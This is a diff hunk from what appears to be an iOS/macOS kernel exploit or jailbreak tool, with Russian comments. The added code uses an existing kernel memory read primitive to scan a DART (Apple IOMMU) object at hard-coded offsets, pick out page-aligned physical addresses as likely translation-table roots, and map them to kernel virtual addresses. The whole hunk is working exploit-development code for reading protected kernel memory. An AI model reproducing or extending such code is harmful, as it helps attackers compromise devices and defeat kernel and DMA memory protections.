@@ -6761,6 +6761,28 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"  [P2] table struct [%u]=%#llx range [%#llx..%#llx) +0x80=%#llx",
                           i, (unsigned long long)ts, (unsigned long long)lo, (unsigned long long)hi, (unsigned long long)leafS]);
             }
+            // 1.9.187 (р.48): корни из ПЕРСИСТЕНТНОГО состояния DART —
+            // shadow [dartObj+0x17f8..0x1870]: объекты со значением [obj+0x10]
+            // (OSNumber); TTBR-подобное значение (page-aligned PA) → root=phystokv.
+            // ctx [dartObj+0xc10] дампим для глаз.
+            if (kpLooksLikeKernelPointer(dartVA)) {
+                uint64_t ctx = kp_untag_ptr(early_kread64(dartVA + 0xc10));
+                kpNote(r, [NSString stringWithFormat:@"  [P2] ctx=[dartObj+0xc10]=%#llx — shadow-scan:",
+                          (unsigned long long)ctx]);
+                for (uint32_t o = 0; o <= 0x88 && nroots < 8; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(dartVA + 0x17f8 + o));
+                    if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                    uint64_t val = early_kread64(P + 0x10);
+                    if (!val) continue;
+                    kpNote(r, [NSString stringWithFormat:@"    shadow+%#x: obj=%#llx [+0x10]=%#llx%@",
+                              o, (unsigned long long)P, (unsigned long long)val,
+                              (!(val & 0x3fff) && val < 0x40000000000ULL) ? @" ← TTBR-кандидат" : @""]);
+                    if (!(val & 0x3fff) && val < 0x40000000000ULL && val > 0x1000) {
+                        uint64_t tva = phystokv(val);
+                        if (kpLooksLikeKernelPointer(tva) && kpSafeToRead(tva)) roots[nroots++] = tva;
+                    }
+                }
+            }
             uint64_t pageIdx = dva >> 14;
             uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
                                  (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
